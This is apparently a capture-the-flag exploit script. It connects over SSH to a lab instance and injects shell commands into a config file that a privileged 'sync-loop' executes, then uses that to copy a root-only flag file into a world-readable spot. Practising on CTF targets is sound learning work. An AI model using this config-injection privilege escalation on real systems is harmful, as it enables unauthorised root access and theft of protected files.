#!/usr/bin/env python3
"""Test if sync-loop actually executes commands"""
import paramiko
import time

HOST = "instance.ctf.tdho.st"
PORT = 32990
USER = "player"
PASSWORD = "reyalp"

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(HOST, port=PORT, username=USER, password=PASSWORD)

def cmd(c):
    stdin, stdout, stderr = ssh.exec_command(c, timeout=15)
    return (stdout.read() + stderr.read()).decode()

print("="*70)
print("TESTING IF SYNC-LOOP EXECUTES COMMANDS")
print("="*70)

# Create a unique marker file to prove execution
marker = f"/tmp/sync_test_{int(time.time())}"

print(f"\n[1] Setting sync command to create marker file: {marker}")
cmd(f'echo "talldwarf-sync-command=touch {marker} && echo EXECUTED > {marker}" > /opt/mc/config/sync-request.conf')

print("[2] Waiting 15 seconds for sync-loop to execute...")
time.sleep(15)

print(f"\n[3] Checking if marker was created...")
result = cmd(f"ls -la {marker} 2>&1")
print(result)

if "No such file" not in result:
    print("  ✓ MARKER FILE EXISTS - sync-loop IS executing commands!")
    content = cmd(f"cat {marker}")
    print(f"  Content: {content}")
    
    # Now try to get the flag
    print("\n[4] Now trying to get the actual flag...")
    cmd('echo "talldwarf-sync-command=cat /root/flag.txt > /tmp/real_flag.txt && chmod 777 /tmp/real_flag.txt" > /opt/mc/config/sync-request.conf')
    time.sleep(15)
    
    flag = cmd("cat /tmp/real_flag.txt 2>&1")
    if "tdho{" in flag or "flag{" in flag:
        print("\n" + "="*70)
        print("🎉 FLAG FOUND!")
        print("="*70)
        print(flag)
        print("="*70)
    else:
        print(f"  No flag yet: {flag}")
else:
    print("  ✗ Marker NOT created - commands are NOT executing")
    
    # Maybe the format is different?
    print("\n[5] Trying alternative command formats...")
    
    formats = [
        f"talldwarf-sync=touch {marker}_alt1",
        f"sync-command=touch {marker}_alt2",
        f"command=touch {marker}_alt3",
    ]
    
    for i, fmt in enumerate(formats):
        print(f"\n  Testing format {i+1}: {fmt}")
        cmd(f'echo "{fmt}" > /opt/mc/config/sync-request.conf')
        time.sleep(12)
        
        test = cmd(f"ls {marker}_alt* 2>&1")
        if "No such file" not in test:
            print(f"    ✓ FORMAT WORKS: {fmt}")
            break

# Check what sync-loop is actually doing
print("\n[6] Checking sync-loop script behavior...")
print("  Current config:")
config = cmd("cat /opt/mc/config/sync-request.conf")
print(f"  {config}")

# Try to trace what sync-loop reads
print("\n[7] Checking file access times...")
print(cmd("stat /opt/mc/config/sync-request.conf"))

ssh.close()
